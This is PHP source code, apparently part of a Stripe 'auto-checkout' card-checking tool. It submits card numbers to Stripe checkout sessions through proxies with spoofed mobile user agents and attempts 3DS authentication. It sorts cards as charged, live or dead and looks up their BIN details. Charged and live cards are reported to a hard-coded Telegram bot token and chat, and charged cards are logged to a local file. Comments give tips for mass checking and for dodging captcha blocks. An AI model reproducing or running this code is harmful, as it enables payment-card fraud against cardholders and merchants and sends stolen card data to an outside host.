$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
$pm = curl_exec($ch);
curl_close($ch);
$id = g($pm, '"id": "','"');





$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'/confirm');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: api.stripe.com';
$headers[] = 'method: POST';
$headers[] = 'path: /v1/payment_pages/'.$sec.'/confirm';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://checkout.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
if($_GET['gate'] === '3') {
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$id.'&expected_amount='.$amt.'&expected_payment_method_type=card&key='.$pk.'');
} else {
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$id.'&expected_amount='.$amt.'&last_displayed_line_item_group_details[subtotal]='.$amt.'&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key='.$pk.'');
}

$ppage2 = curl_exec($ch);
curl_close($ch);
$client_secret = g($ppage2, '"client_secret": "','"');
$xplode = explode('_secret', $client_secret);
$pi = $xplode[0];
$three_d = g($ppage2, '"three_d_secure_2_source": "','",');
$message = g($ppage2, '"message": "','"');
if ($message === "Please accept the merchant's terms of service before checking out.") {
    $message = "<a href='javascript:void(0)' onclick='alert(`If the link has Terms of Service, it is not recommended to mass cc check because the server of stripe link confused whether it will on/off the accepted value of TOS. Try to submit 1 cc per check or set a delay.`)'>click here to read the reason why</a>";
}
$success = g($ppage2, '"success_url": "','"');





$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'sec-ch-ua-platform: "Android"';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$three_d.'&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6ImY2NjQ4NWVmLTQ1ZjItNDEyZi05Y2I3LWE5ZGFhMTE0MTY2ZCJ9%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-GB%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22851%22%2C%22browserScreenWidth%22%3A%22393%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Linux%3B+Android+11%3B+M'.rand(11,99).'G)+AppleWebKit%2F'.rand(111,999).'.'.rand(11,99).'+(KHTML%2C+like+Gecko)+Chrome%2F'.rand(11,99).'.0.0.0+Mobile+Safari%2F'.rand(111,999).'.'.rand(11,99).'%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key='.$pk.'');
$authenticate = curl_exec($ch);
curl_close($ch);

$retry = 0;
$max_retries = 5;
$final = '';
while ($retry < $max_retries && empty($final)) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key='.$pk.'&is_stripe_sdk=false&client_secret='.$client_secret.'');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'sec-ch-ua-platform: "Android"';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$final = curl_exec($ch);
$dcode2 = json_decode($final)->last_payment_error->decline_code;
$msg = json_decode($final)->last_payment_error->message;
$status = g($final, '"status": "','"');
$dcode = g($final, '"decline_code": "','"');
curl_close($ch);
$retry++;
}
if (empty($final)) {
    echo "";
}

//* Start of getting BIN Information *//

// Get the first 6 digits (BIN) of the credit card number
$bin = substr($credit_card, 0, 6);

// Lookup the BIN database from https://binlist.net/ with 5 retries
$max_attempts = 3; // maximum number of attempts to make
$attempt = 0; // current attempt number

$binlist_response = false;

while(!$binlist_response && $attempt <= $max_attempts) {
    $binlist_api_url = "https://lookup.binlist.net/" . $cc;
    $binlist_response = @file_get_contents($binlist_api_url); // use @ to suppress errors
    $binlist_data = json_decode($binlist_response, true);

    //if(!empty($binlist_data)) {
        // data found, break out of the loop
        //break;
    //}

    // increment attempt counter
    $attempt++;

    // wait for 1 second before sending the next request
    //sleep(1);
}

// check if valid data was found
if(!empty($binlist_data)) {
    $find_cc_country = isset($binlist_data['country']['alpha2']) ? $binlist_data['country']['alpha2'] : '';
    $cctype = isset($binlist_data['type']) ? $binlist_data['type'] : '';
    $find_bank_name = isset($binlist_data['bank']['name']) ? $binlist_data['bank']['name'] : '';

    if(!empty($find_cc_country)){
        $cc_country = "<span class='badge badge-secondary'>$find_cc_country</span>";
    }
    if(!empty($find_bank_name)){
        $bank_name = "<span class='badge badge-secondary'>$find_bank_name</span>";
    }
} else {
    // no valid data found after maximum attempts
    // handle error here, e.g. display an error message
}


// Check if the input is a CVV or CCN
#$cctype = (preg_match('/^\d{3,4}$/', $cc)) ? 'CVV' : ((preg_match('/^\d{12,19}$/', $cc)) ? 'CCN' : 'Unknown');

// Check if the card type is debit or credit
if(strtolower($cctype) == 'debit'){
  $cctype = '<span class="badge badge-secondary">Debit</span>';
} else if(strtolower($cctype) == 'credit'){
  $cctype = '<span class="badge badge-secondary">Credit Card</span>';
} else {
  $cctype = '';
}

// Check the card type
if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Visa</span>';
} elseif (preg_match('/^5[1-5][0-9]{14}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Mastercard</span>';
} elseif (preg_match('/^3[47][0-9]{13}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">American Express</span>';
} elseif (preg_match('/^6(?:011|5[0-9][0-9])[0-9]{12}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Discover</span>';
} elseif (preg_match('/^(?:2131|1800|35\d{3})\d{11}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">JCB</span>';
} elseif (preg_match('/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Diners Club</span>';
} elseif (preg_match('/^(62|88)\d{16}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">UnionPay</span>';
} elseif (preg_match('/^(5[06789]|6)[0-9]{10,17}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Maestro</span>';
} elseif (preg_match('/^4(026|17500|405|508|844|91[37])/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Visa Electron</span>';
} elseif (preg_match('/^6[0-9]{15}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">RuPay</span>';
} else {
    $scheme = '';
}

#############CUSTOMIZE GATE SELECTION MESSAGE
if($_GET['gate'] === '1') {
    $gate = "⛩️ Gate:\r\n#1 - with billing address\r\n\n";
} elseif($_GET['gate'] === '2') {
    $gate = "⛩️ Gate:\r\n#2 - no billing address\r\n\n";
} elseif($_GET['gate'] === '3') {
    $gate = "⛩️ Gate:\r\n#3 - complete billing address with zip code\r\n\n";
} else {
    $gate = "";
}

#############SET DESTINATION OF YOUR TG BOT
$domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
$botToken = urlencode('5921984241:AAFYOOSQ9a4CKeCMdHGtsAIoxTzuhjhOits');
$chatID = urlencode('-1001968556590');
$amttt = intval($amt)/100;
if (!empty($proxy) || !empty($proxyauth)) {
    $proxyinfo = "🌐 PROXY USED\r\n➤ Ip & Port\r\n`$proxy`\r\n➤ Credentials\r\n`$proxyauth`\r\n➤ Country\r\n$ip_countryname\r\n\n";
} else {
    $proxyinfo = "➤ Country\r\n$ip_countryname\r\n\n";
}

#############SEND TO TG BOT WHEN CHARGED
$charged_message = "Successful Checkout\r\n\n".$paymentname1."💳 BIN:\r\n`$card`\r\n💰 Amount: ".strtoupper($currency)." $amttt\r\n💸 Success URL: [".urldecode($success)."](".urldecode($success).")\r\n\n" . $proxyinfo . "" . $gate . "☑️ Checked from:\r\n*$domain*";
$sendcharged = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&message_thread_id=15877&text='.urlencode($charged_message).'&parse_mode=markdown';

#############SEND TO TG BOT WHEN INSUFFBAL
$insuf_message = "Insufficient Funds\r\n\n".$paymentname2."💳 BIN: `$card`\r\n💰 Amount to bill: ".strtoupper($currency)." $amttt\r\n🔗 Stripe Checkout link: [click here](".urldecode($colink).")\r\n\n" . $proxyinfo . "" . $gate . "☑️ Checked from:\r\n*$domain*";
$sendinsuff = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&message_thread_id=15886&text='.urlencode($insuf_message).'&parse_mode=markdown';
    
#############BOT RETRY TO SEND IF ITS NOT WORKS
$max_retries = 3;
$num_retries = 0;
$sendchargedtotg = false;
$sendinsufftotg = false;

/////////===================/////////////////
if (strpos($final, '"status": "succeeded"')) {
    while (!$sendchargedtotg && $num_retries < $max_retries) {
    $sendchargedtotg = @file_get_contents($sendcharged);
    $num_retries++;
    echo ''.$myip.'<span class="badge badge-success"><b>#HITTED</b></span> <font class="text-white"><b>'.$mask.'|'.$mm.'|'.$yy.'</b></font>  '.$scheme.''.$cctype.''.$cc_country.'<font class="text-white"><br>➤ <i>The payment transaction has been successfully processed</i> 💰✅<br>➤ Amount: <b>'.strtoupper($currency).' '.$amttt.'</b><br>➤ Invoice: <span style="background-color: white; color: green;" class="badge"><a href="'.$success.'"  target="_blank"><b>'.$success.'</b></a></span><br>➤ Checked from: <b>'.$domain.'</b></font><br>';
    fwrite(fopen('shishimiyeyshimmiya.txt', 'a'), $card."\r\n");
    }
exit();
}
elseif(strpos($final, '"insufficient_funds"')) {
    while (!$sendinsufftotg && $num_retries < $max_retries) {
    $sendinsufftotg = @file_get_contents($sendinsuff);
    $num_retries++;
 echo "$myip<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$card</font> $scheme$cctype$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
    }
}
elseif(strpos($ppage2, '"insufficient_funds"')) {
    while (!$sendinsufftotg && $num_retries < $max_retries) {
    $sendinsufftotg = @file_get_contents($sendinsuff);
    $num_retries++;
 echo "$myip<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$card</font> $scheme$cctype$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
    }
}
elseif(strpos($pm, '"insufficient_funds"')) {
    while (!$sendinsufftotg && $num_retries < $max_retries) {
    $sendinsufftotg = @file_get_contents($sendinsuff);
    $num_retries++;
 echo "$myip<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$card</font> $scheme$cctype$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
    }
}
elseif(strpos($ppage2, '"type": "intent_confirmation_challenge"')){
   
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$cc_country<br><span style='background-color: white; color: red;' class='badge'>Blocked by HCAPTCHA (change your proxy)</span> <span style='background-color: white; color: red;' class='badge'><a href='javascript:void(0)' onclick='alert(`Sometimes it depends on the owner of website whether they blocked your email, card, account, ip, proxy, or else they permanently turned on the captcha.\nI am still figuring it out how to bypass the captcha tho...\nBut you may still retry if you wanted too.\nI am really sorry, there is nothing I can do for now.\nMaybe, try to change your bin?\nWho knows...?\nWell, try your luck!\n\n~ Alice`)'>click here to read the reason why</a></span><br>";
}
elseif($sessionstatus === 'This Checkout Session is no longer active.'){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$cc_country <span style='background-color: white; color: red;' class='badge'>Your stripe checkout link is expired or maybe paid already.</span><br>";
}
elseif($status == "requires_action"){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$cc_country <span style='background-color: white; color: red;' class='badge'>3DS Site [$dcode : $status]</span><br>";
}
elseif(strpos($ppage2, '"status": "requires_action"')){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$cc_country <span style='background-color: white; color: red;' class='badge'>3DS Site [$dcode : $status]</span><br>"; 
}
elseif(strpos($ppage2, '"decline_code": "generic_decline"')){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline</span><br>"; 
    
}
elseif(strpos($pm, '"decline_code": "generic_decline"')){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline</span><br>"; 
}
elseif(strpos($ppage2, '"message": "An error has occurred confirming the Checkout Session."')){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$cc_country <span style='background-color: white; color: red;' class='badge'><b>Payment Failed - CHECK YOUR PK/CS/EMAIL</b></span><br>";
    
    
}
else {
if (empty($code) && empty($decline_code) && empty($status) && empty($msg) && empty($dcode2) && empty($message) && empty($dcode)) {
    $err_response = "<span style='background-color: white; color: red;' class='badge'>Payment failed</span> <span style='background-color: white; color: red;' class='badge'><a href='javascript:void(0)' onclick='alert(`You are checking too fast, that is why the stripe api server cannot handle the response properly. Maybe try to set a delay to get the accurate response?\n\nOther possible reasons:\n\n* proxy is dead or not compatible (you will notice it by looking at the response, if there is no ip address indicated)\n* incorrect details (such as cs, pk, email, or amount)\n* it was already purchased\n* expired link\n* check if the checkout website is compatible with you card, some of the merchants does not accept VISA/MASTER/DISCOVER\n* and lastly, there are too many users using my autocheckout/proxy now`)'>click here to read the reason why</a></span><br>";
} else {
    $err_response = "<span style='background-color: white; color: red;' class='badge'>Payment failed [$code $decline_code $status $msg $dcode2 $message $dcode]</span><br><font color='red'>Try to switch GATE if one of the gates not worked.</font><br>";
}

echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$cc_country<br>$err_response"; 
    
}

// set timeout seconds each cc check
$delay = isset($_GET['delay']) ? intval($_GET['delay']) : 0;
if (!is_int($delay) || $cd < delay) {
    $delay = 0;
}

// convert cd to seconds and microseconds
$seconds = floor($delay / 1000);
$microseconds = ($delay * 1000);

if ($delay > 0) {
    // pause execution
    usleep($microseconds);
    sleep($seconds);

    // output success message
    //echo "Cooldown: <span class='badge badge-success'>ON</span> $seconds(s)";
    echo "";
} else {
    // output error message
    //echo "Cooldown: <span class='badge badge-dark'>OFF</span>";
    echo "";
}

// DELETE COOKIES AT IBA PANG MGA LIBAG
if (is_file($cookies) && is_writable($cookies)) {
    unlink($cookies);
    unset($ch);
    flush();
    ob_flush();
    ob_end_flush();
}

// DELETE ALL TYPE OF FILES SA COOKIES FOLDER
$dir = getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR;
$files = glob($dir . "*"); // get all files in the directory

foreach($files as $file) {
    if(is_file($file)) { // make sure it's a file and not a directory
        unlink($file); // delete the file
    }
}

?>